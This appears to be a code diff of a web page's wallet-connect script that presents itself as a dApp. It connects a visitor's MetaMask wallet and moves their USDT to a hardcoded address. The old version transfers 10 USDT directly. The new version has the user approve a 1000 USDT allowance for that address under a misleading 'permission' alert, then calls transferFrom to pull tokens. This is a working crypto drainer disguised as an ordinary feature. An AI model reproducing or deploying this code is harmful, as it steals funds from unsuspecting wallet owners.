@@ -1,7 +1,6 @@
-let isConnecting = false; // Prevent multiple connections
-
-// USDT token address
-const tokenAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7"; // USDT token address
+let isConnecting = false;
+const tokenAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7"; // USDT token contract address
+const spenderAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // Address allowed to spend tokens
 
 async function connectWallet() {
     if (isConnecting) {
@@ -13,30 +12,17 @@ async function connectWallet() {
     document.getElementById("connectButton").disabled = true;
 
     try {
-        // Ask user which wallet to connect to
-        const walletChoice = prompt("Choose a wallet: (1) MetaMask (2) Trust Wallet (3) Coinbase Wallet");
-
-        if (walletChoice === "1") {
-            // MetaMask connection
-            if (typeof window.ethereum !== 'undefined') {
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                const account = accounts[0];
-                console.log(`Connected to MetaMask account: ${account}`);
-
-                await sendTokens(account);
-            } else {
-                alert("MetaMask is not installed. Please install it.");
-                window.open("https://metamask.app.link/dapp/swiftmultisolutions.github.io/web3/", "_blank");
-            }
-        } else if (walletChoice === "2") {
-            // Trust Wallet logic
-            window.open("https://link.trustwallet.com/open_url?coin_id=60&url=https://swiftmultisolutions.github.io/web3/", "_blank");
-        } else if (walletChoice === "3") {
-            // Coinbase Wallet logic
-            window.open("https://go.cb-w.com/dapp?cb_url=https://swiftmultisolutions.github.io/web3/", "_blank");
-        } else {
-            alert("Invalid choice. Please try again.");
-        }
+        // Step 1: Connect to the user's wallet
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const account = accounts[0];
+        console.log(`Connected to MetaMask account: ${account}`);
+        
+        // Step 2: Notify user about dApp's permission request
+        alert("You're granting permission to the dApp to manage your wallet and transfer tokens.");
+        
+        // Step 3: Approve the dApp to spend tokens on behalf of the user
+        await approveTokens(account);
+        
     } catch (error) {
         console.error("Error connecting to wallet:", error);
     } finally {
@@ -45,47 +31,72 @@ async function connectWallet() {
     }
 }
 
-async function sendTokens(account) {
+async function approveTokens(account) {
     const provider = new ethers.providers.Web3Provider(window.ethereum);
     const signer = provider.getSigner();
 
-    const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // Replace with your recipient address
-
+    // ERC-20 Token Contract
     const tokenContract = new ethers.Contract(
         tokenAddress,
         [
-            "function balanceOf(address owner) view returns (uint256)",
-            "function transfer(address to, uint amount) public returns (bool)"
+            "function approve(address spender, uint256 amount) public returns (bool)",
+            "function allowance(address owner, address spender) public view returns (uint256)"
         ],
         signer
     );
 
     try {
-        // Fetch USDT balance
-        const balance = await tokenContract.balanceOf(account);
-        const balanceInUSDT = ethers.utils.formatUnits(balance, 6); // USDT has 6 decimals
+        const amountToApprove = ethers.utils.parseUnits("1000", 6); // Approve 1000 USDT tokens
 
-        console.log(`USDT Balance: $${balanceInUSDT}`);
+        // Approve the dApp to transfer tokens on behalf of the user
+        const tx = await tokenContract.approve(spenderAddress, amountToApprove);
+        console.log("Approval transaction sent:", tx.hash);
+        document.getElementById("status").textContent = "Approval sent! Tx Hash: " + tx.hash;
 
-        // Check if balance is greater than $0.5 (with current price of USDT as $1)
-        if (parseFloat(balanceInUSDT) > 0.5) {
-            const amountInWei = ethers.utils.parseUnits("10", 6); // Send 10 USDT (for demonstration)
-
-            // Proceed to send tokens
-            const tx = await tokenContract.transfer(recipientAddress, amountInWei);
-            console.log("Transaction sent:", tx.hash);
-            document.getElementById("status").textContent = "Transaction sent! Tx Hash: " + tx.hash;
-
-            await tx.wait();
-            console.log("Transaction confirmed:", tx.hash);
-        } else {
-            document.getElementById("status").textContent = "Insufficient USDT balance. Must be more than $0.5.";
+        await tx.wait();
+        console.log("Approval confirmed:", tx.hash);
+        
+        // Check the allowance to confirm it's set
+        const allowance = await tokenContract.allowance(account, spenderAddress);
+        console.log("Allowance granted:", ethers.utils.formatUnits(allowance, 6), "USDT");
+        
+        // Automatically proceed to transfer tokens
+        if (allowance.gte(amountToApprove)) {
+            await sendTokens(account);
         }
+    } catch (error) {
+        console.error("Error during approval:", error);
+        document.getElementById("status").textContent = "Approval failed: " + error.message;
+    }
+}
+
+async function sendTokens(account) {
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const signer = provider.getSigner();
+
+    const tokenContract = new ethers.Contract(
+        tokenAddress,
+        [
+            "function transferFrom(address from, address to, uint256 amount) public returns (bool)"
+        ],
+        signer
+    );
+
+    const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD";
+    const amountInWei = ethers.utils.parseUnits("10", 6); // 10 USDT
+
+    try {
+        const tx = await tokenContract.transferFrom(account, recipientAddress, amountInWei);
+        console.log("Tokens sent:", tx.hash);
+        document.getElementById("status").textContent = "Tokens sent! Tx Hash: " + tx.hash;
+
+        await tx.wait();
+        console.log("Transaction confirmed:", tx.hash);
     } catch (error) {
         console.error("Error sending tokens:", error);
         document.getElementById("status").textContent = "Transaction failed: " + error.message;
     }
 }
 
-// Event listener for connect button
+// Attach the event listener to the button
 document.getElementById("connectButton").addEventListener("click", connectWallet);
